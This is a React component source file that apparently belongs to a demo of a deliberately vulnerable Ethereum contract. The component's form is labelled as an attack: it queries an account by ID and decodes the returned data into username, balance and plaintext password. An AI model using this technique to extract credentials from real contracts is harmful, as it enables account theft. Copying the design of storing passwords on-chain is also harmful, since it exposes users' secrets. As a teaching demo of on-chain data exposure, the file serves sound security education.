import React, { Component } from 'react';
import { getUserInfo } from "../../web3/users";
import MoneyExchange from "../../web3/artifacts/MoneyExchange.json";
const ethUtils = require('web3-utils');

class AccountForm extends React.Component {
    constructor(props) {
        super(props);
        this.state = {value: ''};
        this.handleChange = this.handleChange.bind(this);
        this.handleSubmit = this.handleSubmit.bind(this);
    }

    handleChange(event) {    this.setState({value: event.target.value});  }
    async handleSubmit(event) {
        event.preventDefault();
        const result = await getUserInfo(parseInt(this.state.value)) 
        let returnValue = "Raw return value of function: "; 
        returnValue += JSON.stringify(result) + "\n";
        returnValue += "Attacker can then simply use parseInt or web3-utils hexToAscii \n";
        returnValue += "ID: " + parseInt(result[0]) + " \n";
        returnValue += "Username: " + ethUtils.hexToAscii(result[1]) + "\n";
        returnValue += "Account Balance: " + parseInt(result[2]) + " \n";
        returnValue += "Password: " + ethUtils.hexToAscii(result[3]);
        this.props.parentCallback(returnValue);
    }

  render() {
    return (
        <div>
            <h4>View Account Information (Attack on the Vulnerability)</h4>
            <form onSubmit={this.handleSubmit}>
                <label>
                    Enter Account ID:  
                <input type="text" value={this.state.value} onChange={this.handleChange} />
                </label>
                <input type="submit" value="Submit" />
            </form>
        </div>
    );
  }
}

export default AccountForm;

